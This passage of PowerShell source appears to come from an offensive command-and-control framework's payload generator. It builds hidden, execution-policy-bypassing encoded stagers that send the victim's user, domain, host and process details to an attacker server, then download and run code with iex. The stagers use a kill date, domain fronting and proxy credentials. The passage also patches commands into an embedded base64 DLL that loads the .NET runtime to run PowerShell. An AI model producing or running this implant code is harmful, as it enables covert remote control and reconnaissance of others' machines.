        $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
        $payload = $payloadraw -replace "`n", ""
        [IO.File]::WriteAllLines("$FolderPath\payloads\payload.bat", $payload)

        Write-Host -Object "Payload written to: $FolderPath\payloads\payload.bat"  -ForegroundColor Green
    }
    
    function PatchDll {
        param($dllBytes, $replaceString, $Arch)

        if ($Arch -eq 'x86') {
            $dllOffset = 0x00003640
            $dllOffset = $dllOffset +8
        }
        if ($Arch -eq 'x64') {
            $dllOffset = 0x00004470
        }

        # Patch DLL - replace 5000 A's
        $AAAA = "A"*5000
        $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
        $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
    
        # Length of replacement code
        $dllLength = $replaceString.Length
        $patchLength = 5000 -$dllLength
        $nullString = 0x00*$patchLength
        $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
        $nullBytes = $nullBytes[1..$patchLength]
        $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)

        $dllLength = 10000 -3
        $i=0
        # Loop through each byte from start position
        $dllOffset..($dllOffset + $dllLength) | % {
            $dllBytes[$_] = $replaceNewStringBytes[$i]
            $i++
        }
    
        # Return Patched DLL
        return $DllBytes
    }

    # create proxypayloads
    function CreateProxyPayload 
    {
        param
        (
            [Object]
            $username,
            [Object]
            $password,
            [Object]
            $proxyurl
        )
        $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie)
{
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$username = "'+$username+'"
$password = "'+$password+'"
$proxyurl = "'+$proxyurl+'"
$wc = New-Object System.Net.WebClient;  
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($proxyurl) {
$wp = New-Object System.Net.WebProxy($proxyurl,$true); 
if ($username -and $password) {
$PSS = ConvertTo-SecureString $password -AsPlainText -Force; 
$getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
$wp.Credentials = $getcreds;
} else {
$wc.UseDefaultCredentials = $true; 
}
$wc.Proxy = $wp;
}
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
}
$wc
} 
function primer
{
if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
$pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pretext)
$primer = (Get-Webclient).downloadstring("'+$ipv4address+":"+$serverport+'/connect?$p64")
$primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
$primer
} 
$primer = primer
if ($primer) {$primer| iex} else {
start-sleep 10
primer | iex
}'
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    [IO.File]::WriteAllLines("$FolderPath\payloads\proxypayload.bat", $payload)
    [IO.File]::WriteAllLines("$PoshPath\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
    Write-Host -Object "Payload written to: $FolderPath\payloads\proxypayload.bat"  -ForegroundColor Green
    Write-Host -Object "Payload written to: $PoshPath\Modules\proxypayload.ps1"  -ForegroundColor Green

    $86="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AAAAAAAAAAAuAE4ARQBUACAAcgB1AG4AdABpAG0AZQAgAHYAMgAuADAALgA1ADAANwAyADcAIABjAGEAbgBuAG8AdAAgAGIAZQAgAGwAbwBhAGQAZQBkAAoAAAAAAAAASQBDAEwAUgBSAHUAbgB0AGkAbQBlAEkAbgBmAG8AOgA6AEcAZQB0AEkAbgB0AGUAcgBmAGEAYwBlACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABDb3JCaW5kVG9SdW50aW1lAAAAAAAAAABDAG8AdQBsAGQAIABuAG8AdAAgAGYAaQBuAGQAIABBAFAASQAgAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAAAB3AGsAcwAAAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAABtAHMAYwBvAHIAZQBlAC4AZABsAGwAAABQcm9ncmFtAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAdABoAGUAIAByAHUAbgB0AGkAbQBlACAAaABvAHMAdAAKAAAAAABDAEwAUgAgAGYAYQBpAGwAZQBkACAAdABvACAAcwB0AGEAcgB0ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABSAHUAbgB0AGkAbQBlAEMAbAByAEgAbwBzAHQAOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAQQBwAHAARABvAG0AYQBpAG4ASQBkACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABJAEMAbwByAFIAdQBuAHQAaQBtAGUASABvAHMAdAA6ADoARwBlAHQARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAGQAZQBmAGEAdQBsAHQAIABBAHAAcABEAG8AbQBhAGkAbgAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABsAG8AYQBkACAAdABoAGUAIABhAHMAcwBlAG0AYgBsAHkAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIAB0AGgAZQAgAFQAeQBwAGUAIABpAG4AdABlAHIAZgBhAGMAZQAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAFIAdQBuAFAAUwAAAAAAAABTAGEAZgBlAEEAcgByAGEAeQBQAHUAdABFAGwAZQBtAGUAbgB0ACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABpAG4AdgBvAGsAZQAgAEkAbgB2AG8AawBlAFAAUwAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAACe2zLTs7klQYIHoUiE9TIWImcvyzqr0hGcQADAT6MKPtyW9gUpK2M2rYvEOJzypxMjZy/LOqvSEZxAAMBPowo+jRiAko4OZ0izDH+oOITo3tLROb0vumpIibC0sMtGaJEAAAAAWA6